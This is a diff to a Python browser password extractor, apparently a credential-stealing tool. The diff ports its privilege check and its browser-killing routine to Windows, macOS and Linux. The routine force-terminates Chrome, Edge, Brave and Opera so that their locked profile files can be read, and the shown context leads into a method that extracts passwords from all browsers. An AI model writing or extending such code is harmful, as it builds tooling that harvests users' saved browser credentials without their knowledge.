@@ -114,34 +114,96 @@ class UnifiedBrowserExtractor:
     
     def check_admin_privileges(self):
         """Check if running with administrator privileges"""
-        try:
-            import ctypes
-            return ctypes.windll.shell32.IsUserAnAdmin() != 0
-        except:
-            return False
+        if sys.platform == 'win32':
+            # Windows: Check if running as administrator
+            try:
+                import ctypes
+                return ctypes.windll.shell32.IsUserAnAdmin() != 0
+            except:
+                return False
+        elif sys.platform == 'darwin':  # macOS
+            # macOS: Check if running as root
+            return os.geteuid() == 0
+        else:  # Linux
+            # Linux: Check if running as root
+            return os.geteuid() == 0
     
     def kill_browser_processes(self):
         """Terminate browser processes to avoid file locks"""
-        browsers = ['chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe']
-        killed_processes = []
-        
-        print(f"{Fore.YELLOW}Terminating browser processes to avoid file locks...")
-        
-        for browser in browsers:
-            try:
-                result = subprocess.run(['taskkill', '/F', '/IM', browser], 
-                                     capture_output=True, text=True)
-                if result.returncode == 0:
-                    killed_processes.append(browser)
-            except:
-                pass
-        
-        if killed_processes:
-            print(f"{Fore.GREEN}Terminated: {', '.join(killed_processes)}")
-        else:
-            print(f"{Fore.YELLOW}No browser processes found running")
-        
-        time.sleep(2)  # Wait for processes to fully terminate
+        if sys.platform == 'win32':
+            # Windows: Use taskkill
+            browsers = ['chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe']
+            killed_processes = []
+            
+            print(f"{Fore.YELLOW}Terminating browser processes to avoid file locks...")
+            
+            for browser in browsers:
+                try:
+                    result = subprocess.run(['taskkill', '/F', '/IM', browser], 
+                                         capture_output=True, text=True)
+                    if result.returncode == 0:
+                        killed_processes.append(browser)
+                except:
+                    pass
+            
+            if killed_processes:
+                print(f"{Fore.GREEN}Terminated: {', '.join(killed_processes)}")
+            else:
+                print(f"{Fore.YELLOW}No browser processes found running")
+            
+            time.sleep(2)  # Wait for processes to fully terminate
+        elif sys.platform == 'darwin':  # macOS
+            # macOS: Use killall
+            browsers = ['Google Chrome', 'Microsoft Edge', 'Brave Browser', 'Opera']
+            killed_processes = []
+            
+            print(f"{Fore.YELLOW}Terminating browser processes to avoid file locks...")
+            
+            for browser in browsers:
+                try:
+                    result = subprocess.run(['killall', browser], 
+                                         capture_output=True, text=True)
+                    if result.returncode == 0:
+                        killed_processes.append(browser)
+                except:
+                    pass
+            
+            if killed_processes:
+                print(f"{Fore.GREEN}Terminated: {', '.join(killed_processes)}")
+            else:
+                print(f"{Fore.YELLOW}No browser processes found running")
+            
+            time.sleep(2)  # Wait for processes to fully terminate
+        else:  # Linux
+            # Linux: Use killall or pkill
+            browsers = ['chrome', 'microsoft-edge', 'brave', 'opera']
+            killed_processes = []
+            
+            print(f"{Fore.YELLOW}Terminating browser processes to avoid file locks...")
+            
+            for browser in browsers:
+                try:
+                    # Try killall first
+                    result = subprocess.run(['killall', browser], 
+                                         capture_output=True, text=True)
+                    if result.returncode == 0:
+                        killed_processes.append(browser)
+                except:
+                    try:
+                        # Fallback to pkill
+                        result = subprocess.run(['pkill', browser], 
+                                             capture_output=True, text=True)
+                        if result.returncode == 0:
+                            killed_processes.append(browser)
+                    except:
+                        pass
+            
+            if killed_processes:
+                print(f"{Fore.GREEN}Terminated: {', '.join(killed_processes)}")
+            else:
+                print(f"{Fore.YELLOW}No browser processes found running")
+            
+            time.sleep(2)  # Wait for processes to fully terminate
     
     def extract_passwords(self):
         """Extract passwords from all browsers"""
